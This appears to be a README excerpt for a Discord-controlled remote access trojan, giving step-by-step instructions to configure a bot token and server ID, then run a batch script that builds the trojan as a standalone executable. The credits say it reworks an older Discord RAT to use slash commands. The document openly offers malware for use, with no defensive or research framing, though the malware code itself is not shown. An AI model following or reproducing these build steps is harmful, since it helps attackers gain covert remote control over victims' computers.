### 📁・Setting up the RAT
1. Start off by ofc installing [python](https://www.python.org/)
2. Download the code now and open a cmd in the directory and type `pip install -r requirements.txt`
3. Now time to get the bot token, follow this guide [here](https://www.writebots.com/discord-bot-token) on how to do that
4. Go into main.py
   - go to where it says `token = 'BOT_TOKE_HERE'` (line 35)
     - Replace `BOT_TOKE_HERE` with your bot token that you got from the [developer page](https://discord.com/developers)
       - go to where it says `g = [GUILD_ID_HERE]` (line 36)
         - Replace `GUILD_ID_HERE` with the id of your server that you want the bot to be in ([server id?](https://support.discord.com/hc/en-us/articles/206346498-Where-can-I-find-my-User-Server-Message-ID))
5. Now your ready to invite your bot to your server, simply follow [this guide](https://discordjs.guide/preparations/adding-your-bot-to-servers.html#bot-invite-links)
6. When your done with all of that, simply open **build-exe.bat** and enter a name for the exe and now your done!

### 🎉・Credits
Although this discord rat was created by me (Rdimo#6969) the original is https://github.com/Sp00p64/DiscordRAT and credits goes to him and his discord rat. His is quite old and uses message event to execute his commands so thought I would do slash commands and added/improved/removed some commands aswell. Additionally some code for the commands belong to him
